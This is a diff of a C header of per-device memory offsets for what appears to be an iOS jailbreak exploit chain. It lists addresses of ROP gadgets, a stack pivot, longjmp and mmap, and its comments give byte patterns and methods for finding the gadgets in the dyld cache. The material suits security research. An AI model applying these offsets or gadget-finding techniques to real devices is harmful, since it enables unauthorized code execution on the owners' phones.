@@ -1,4 +1,9 @@
 #ifndef JBOFFSETS_H
+#define JBOFFSETS_H
+
+// If you forget to enable this when you don't have the right offset in stage1.h,
+// you'll receive a segfault in stage 1 (KERN_INVALID_ADDRESS) with pc = OFF_BEAST_GADGET since it won't be mapped
+#define STAGE1FD_SCREAM_TEST 0
 
 // Define devices
 #define N41_10_3_4 0
@@ -68,7 +73,7 @@
 // #define OFF_CBZ_X0_X16_LOAD 0x1b1c0e000+0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 // #define OFF_ADD_X0_GADGET 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
 // #define OFF_ERRNO 0x1b30f1000+0xff8+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
-// #define OFF_MACH_MSG 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
+// #define OFF_NDR_RECORD 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
 // #define OFF_LONGJMP realsym(dyld_cache_path,"__longjmp") // dlsym of __longjmp
 // #define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov x2, sp
 // #define OFF_MMAP realsym(dyld_cache_path,"___mmap") // dlsym of ___mmap
@@ -140,7 +145,7 @@
 #define OFF_CBZ_X0_X16_LOAD 0x1b1c16000+0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 #define OFF_ADD_X0_GADGET 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
 #define OFF_ERRNO 0x1b30f9000+0xff8+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
-#define OFF_MACH_MSG 0x1b189e018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
+#define OFF_NDR_RECORD 0x1b189e018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
 #define OFF_LONGJMP 0x180b126e8 // dlsym of __longjmp
 #define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov sp, x2
 #define OFF_MMAP 0x18097cbf4 // dlsym of ___mmap
@@ -306,7 +311,7 @@
 #define OFF_CBZ_X0_X16_LOAD 0x1b1c0e000+0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 #define OFF_ADD_X0_GADGET 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
 #define OFF_ERRNO 0x1b30f1000+0xff8+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
-#define OFF_MACH_MSG 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
+#define OFF_NDR_RECORD 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
 #define OFF_LONGJMP realsym(dyld_cache_path,"__longjmp") // dlsym of __longjmp
 #define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov x2, sp
 #define OFF_MMAP realsym(dyld_cache_path,"___mmap") // dlsym of ___mmap
@@ -377,7 +382,7 @@
 #define OFF_CBZ_X0_X16_LOAD 0x1b1d72000+0x4c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 #define OFF_ADD_X0_GADGET 0x18519cb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
 #define OFF_ERRNO 0x1b3263000+0xff8+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
-#define OFF_MACH_MSG 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // VERIFY! address of label _NDR_record, we need to map it before using it
+#define OFF_NDR_RECORD 0x1b1896018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // VERIFY! address of label _NDR_record, we need to map it before using it
 #define OFF_LONGJMP realsym(dyld_cache_path,"__longjmp") // dlsym of __longjmp
 #define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov x2, sp
 #define OFF_MMAP realsym(dyld_cache_path,"___mmap") // dlsym of ___mmap
